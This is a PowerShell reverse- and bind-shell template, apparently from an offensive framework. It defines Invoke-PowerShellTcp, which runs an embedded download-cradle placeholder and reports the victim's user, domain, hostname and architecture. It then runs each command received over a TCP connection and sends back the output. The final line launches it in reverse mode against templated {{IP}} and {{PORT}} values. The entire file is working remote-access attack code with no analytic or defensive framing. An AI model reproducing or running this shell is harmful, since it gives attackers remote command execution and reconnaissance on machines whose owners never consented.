$DL_CRADLE = @'
{{dl_cradle}}
'@

function Invoke-PowerShellTcp
{

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )
    function Read-ShellPacket {
        param (
            [Parameter(Position = 0)] $Stream
        )
        $stream.Read($bytes, 0, 2)
        $packet_type = $bytes
        $stream.Read($bytes, 0, 4)
        $packet_length = $bytes
        if ([BitConverter]::IsLittleEndian) {
            [Array]::reverse($packet_length)
        }
        $len = [BitConverter]::ToInt32($packet_length)
        $stream.Read($bytes, 0, $len)
        $body = $bytes
        $body = ([text.encoding]::ASCII).GetBytes($body)
        $body | ConvertFrom-JSON
    }

    function Write-ShellPacket {
        param (
            [Parameter(Position = 0)] $Packet,
            [Parameter(Position = 1)] $Stream
        )
        $body = ($Packet | ConvertTo-JSON)
        $body = ([text.encoding]::ASCII).GetBytes($body)
        $packet_length = [BitConverter]::GetBytes($body.length)
        if ([BitConverter]::IsLittleEndian) {
            [Array]::reverse($packet_length)
        }
        $packet_type = [byte[]](0x0,0x0)
        $Stream.Write($packet_type + $packet_length + $body, 0, 6 + $body.length)
        $Stream.Flush()
    }

    function Get-ShellHello {
        @{
            "msg_type" = "SHELL_HELLO"
            "data" = @{
                "user" = "$ENV:USERNAME"
                "domain" = "$ENV:USERDOMAIN"
                "hostname" = "$ENV:COMPUTERNAME"
                "arch" = "$ENV:PROCESSOR_ARCHITECTURE"
                "ps_version" = [String]$PSVersionTable.PSVersion
                "os_version" = [String]$PSVersionTable.BuildVersion
            }
        }
    }
    function Get-ShellPrompt {
        @{
            "msg_type" = "PROMPT"
            "data" = 'PS ' + (Get-Location).Path + '> '
        }
    }

    function Get-OutputStreams {
        param (
            [Parameter(Position = 0)] $Streams
        )
        $result = @()
        $error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_ }) }
        $error.clear()
        $Streams.Error | % { $result+=(@{ "msg_type" = "STREAM_ERROR"; "data" = $_.MessageData.Message }) }
        $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.MessageData.Message }) }
        $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.MessageData.Message }) }
        $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.MessageData.Message }) }
        $Streams.Progress | % { $result+=(@{ "msg_type" = "STREAM_PROGRESS"; "data" = $_.MessageData.Message }) }
        $Streams.Information | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.MessageData.Message }) }
        $result
    }

    #Connect back if the reverse switch is used.
    if ($Reverse)
    {
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        if (-not $client) { Return }
    }

    #Bind to the provided port if Bind switch is used.
    if ($Bind)
    {
        $listener = [System.Net.Sockets.TcpListener]$Port
        $listener.start()
        $client = $listener.AcceptTcpClient()
    }

    $error.clear()
    $stream = $client.GetStream()
    $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
    [byte[]]$bytes = 0..1024|%{0}

    #Create PowerShell object
    $PowerShell = [powershell]::Create()
    [void]$PowerShell.AddScript($DL_CRADLE)

    Write-ShellPacket (Get-ShellHello) $stream

    $init = ( $PowerShell.Invoke() | Out-String )
    # https://stackoverflow.com/questions/27254198/why-cant-i-write-error-from-powershell-streams-error-add-dataadded
    # https://stackoverflow.com/questions/54107825/how-to-pass-warning-and-verbose-streams-from-a-remote-command-when-calling-power

    Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }

    Write-ShellPacket (Get-ShellPrompt) $stream

    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
    $data = ""
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $data = $EncodedText.GetString($bytes,0, $i)

        #Execute the command on the target.
        [void]$PowerShell.AddScript($data)
        $output = ( $PowerShell.Invoke() )

        Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = $output } $stream

        Get-OutputStreams | % { Write-ShellPacket $_ $stream }

        Write-ShellPacket (Get-ShellPrompt) $stream
    }
    if ($client) { $client.Close() }
    if ($listener) {$listener.Stop()}
}


Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse
